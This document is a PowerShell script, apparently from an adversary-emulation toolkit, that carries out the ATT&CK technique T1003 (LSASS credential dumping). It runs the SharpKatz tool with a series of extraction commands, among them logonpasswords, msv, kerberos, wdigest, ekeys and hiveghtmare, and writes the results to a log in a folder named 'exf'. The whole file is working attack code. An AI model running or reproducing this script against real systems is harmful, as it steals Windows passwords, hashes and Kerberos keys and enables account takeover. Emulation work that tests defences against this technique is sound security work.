# Credential Dump
# Technic ID : T1003
Clear-Host
Write-Output "==============================================================================="
Write-Output "OS Credential Dumping: LSASS Memory (T1003)"
Write-Output "==============================================================================="
#
$SharpKatz = "$env:PUBLIC\Toolz\sharpkatz.exe";
$SharpKatzLogFile = "$env:PUBLIC\exf\SharpKatz.txt";
$Parameter = @("ekeys", "msv", "kerberos", "tspkg", "credman", "wdigest", "logonpasswords", "listshadows", "hiveghtmare");

if ([System.IO.File]::Exists("$SharpKatz")) {
    Write-Output "GREAT. The command $SharpKatz has been found :-)" | Out-File -FilePath "$SharpKatzLogFile"-Encoding ascii -Append;
    try {
        foreach ($Command in $Parameter) {
            $ServiceCmd = "$SharpKatz --Command" + " " + $Command;
            Write-Output "Launch command : " $ServiceCmd  | Out-File -FilePath "$SharpKatzLogFile" -Append -Encoding ascii;
            Invoke-Expression "$ServiceCmd"  | Out-File -FilePath "$SharpKatzLogFile" -Append -Encoding ascii;
        }
    }
    catch {
        Write-Output "Error while excecuting command $ServiceCmd error code : $($_.Exception.Message)" | Out-File -FilePath "$SharpKatzLogFile" -Encoding ascii -Append;
        exit 2;      
    }                        
    exit 0;
}
else {
    Write-Output "The command $SharpKatz does not exists !!!" | Out-File -FilePath "$SharpKatzLogFile" -Encoding ascii -Append;
    exit 1;
};


